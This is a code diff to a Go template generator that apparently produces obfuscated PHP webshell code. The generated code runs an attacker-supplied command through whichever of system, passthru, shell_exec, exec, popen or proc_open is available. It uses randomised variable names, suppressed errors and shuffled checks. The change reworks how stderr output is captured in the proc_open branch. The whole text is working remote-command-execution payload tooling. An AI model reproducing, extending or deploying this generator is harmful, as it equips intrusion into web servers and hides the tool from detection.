@@ -129,7 +129,7 @@ func (t *PHPTemplates) Exec() (string, map[string]string) {
 		{ref: seR, caller: fmt.Sprintf("print(@%s($%s))", seR, varC)},
 		{ref: exR, caller: fmt.Sprintf("@%s($%s,$%s,$%s);print(join(\"\\n\",$%s))", exR, varC, varO, varRet, varO)},
 		{ref: poR, caller: fmt.Sprintf("$%s=@%s($%s,'r');while(!@feof($%s)){print(@fgets($%s,2048));}@pclose($%s)", phpVar6(), poR, varC, phpVar6(), phpVar6(), phpVar6())},
-		{ref: prR, caller: fmt.Sprintf("$%s=@%s($%s,array(1=>array('pipe','w'),2=>array('pipe','w')),$%s);while(!@feof($%s[1])){print(@fgets($%s[1],2048));}while(!@feof($%s[2])){print(@fgets($%s[2],2048));}$%s=0;@fclose($%s[1]);@fclose($%s[2]);@proc_close($%s)", phpVar6(), prR, varC, phpVar6(), phpVar6(), phpVar6(), phpVar6(), varRet, phpVar6(), phpVar6())},
+		{ref: prR, caller: fmt.Sprintf("$%s=@%s($%s,array(1=>array('pipe','w'),2=>array('redirect',1)),$%s);while(!@feof($%s[1])){print(@fgets($%s[1],2048));}$%s=0;@fclose($%s[1]);@fclose($%s[2]);@proc_close($%s)", phpVar6(), prR, varC, phpVar6(), phpVar6(), phpVar6(), phpVar6(), varRet, phpVar6(), phpVar6())},
 	}
 	shuffleChecks(checks)
 
@@ -171,7 +171,7 @@ func (t *PHPTemplates) Exec() (string, map[string]string) {
 		"function runcmd($" + varRuncmd + "){global " + buildGlobalList([]funcCheck{{ref: sysR}, {ref: psR}, {ref: seR}, {ref: exR}, {ref: poR}, {ref: prR}}) + ";$" + varRet + "=0;$" + varDir + "=dirname($_SERVER['SCRIPT_FILENAME']);" +
 		ifElseChain +
 		"return $" + varRet + ";}" +
-		"$" + varRet + "=@runcmd($" + varR + ".' 2>&1');" +
+		"$" + varRet + "=@runcmd($" + varR + ");" +
 		"if($" + varRet + "!=0){echo 'ret=' . $" + varRet + ";}"
 
 	params := map[string]string{
